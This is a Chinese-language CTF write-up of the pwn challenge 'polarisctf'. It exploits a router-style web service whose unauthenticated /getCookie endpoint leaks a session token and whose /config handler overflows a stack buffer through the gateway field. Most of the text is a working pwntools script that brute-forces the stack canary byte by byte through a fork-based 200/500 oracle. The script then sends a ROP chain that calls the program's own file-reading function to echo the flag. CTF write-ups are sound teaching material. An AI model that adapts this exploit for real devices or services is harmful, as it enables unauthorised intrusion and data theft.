## 思路

1. `GET /getCookie` 未鉴权，任何人都能拿到当前有效的 `token`。
2. 带着这个 `token` 访问 `POST /config`。
3. `/config` 在 `sub_4035A0` 里把四个字段直接 `memcpy` 到栈上固定缓冲区，没有长度检查，`gateway` 可溢出到 canary 和返回地址。
4. 服务是 `fork` ，所以可以通过返回 `200/500` 爆破 canary。
5. 爆出 canary 后，构造 ROP 跳到程序自带的读文件函数 `sub_402BDB(fd, filename, status)`。
6. 把 `gateway` 开头伪造成 `flag\x00`，再用 `ret` 做栈对齐，随后 `pop rdi ; ret` 设置 socket fd，最后跳到 `sub_402BDB`，直接把 `flag` 文件内容回显出来。
## 关键点

- 未鉴权拿 cookie: `/getCookie`
- 栈溢出入口: `/config`
- 必须先补一个 `ret`，不然栈对齐不对，调用读文件函数会直接崩

def recv_all(sock):
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except EOFError:
            break
    return data


def get_cookie():
    tube = remote(host, port)
    tube.send(b"GET /getCookie HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    resp = recv_all(tube)
    tube.close()
    match = re.search(br"Set-Cookie: ([^\r\n]+)", resp)
    if not match:
        raise ValueError("token not found")
    return match.group(1)


def build_form(route_name, ip, subnet_mask, gateway):
    fields = [
        ("route_name", route_name),
        ("ip", ip),
        ("subnet_mask", subnet_mask),
        ("gateway", gateway),
    ]
    body = "&".join(
        f"{k}={urllib.parse.quote_from_bytes(v if isinstance(v, bytes) else v.encode())}"
        for k, v in fields
    )
    return body.encode()


def post_config(body, cookie):
    tube = remote(host, port)
    req = (
        b"POST /config HTTP/1.1\r\nHost: x\r\nCookie: "
        + cookie
        + b"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "
        + str(len(body)).encode()
        + b"\r\nConnection: close\r\n\r\n"
        + body
    )
    tube.send(req)
    resp = recv_all(tube)
    tube.close()
    return resp


def oracle(prefix):
    cookie = get_cookie()
    gateway = b"A" * 40 + prefix
    body = build_form(b"R", b"I", b"S", gateway)
    resp = post_config(body, cookie)
    return resp.startswith(b"HTTP/1.1 200")


def leak_canary():
    canary = b"\x00"
    for idx in range(1, 8):
        for val in range(256):
            guess = canary + bytes([val])
            if oracle(guess):
                canary = guess
                break
        else:
            raise ValueError(f"failed at byte {idx}")
    return canary


def trigger_read_file(canary):
    ret = 0x40101A
    pop_rdi = 0x4016DE
    read_file = 0x402BDB
    prefix = b"flag\x00" + b"A" * (40 - 5)
    rop = flat(
        canary,
        b"P" * 24,
        p64(ret),
        p64(pop_rdi),
        p64(4),
        p64(read_file),
        p64(0xDEADBEEFDEADBEEF),
    )
    body = build_form(b"R", b"I", b"S", prefix + rop)
    return post_config(body, get_cookie())


def parse_flag(resp):
    text = resp.decode("latin1", "replace")
    match = re.search(r"(polarisctf\{[^}]+\}|flag\{[^}]+\})", text)
    if not match:
        raise ValueError(text)
    return match.group(1)


def pwn(io, p, libc):
    canary = leak_canary()
    resp = trigger_read_file(canary)
    print(parse_flag(resp))
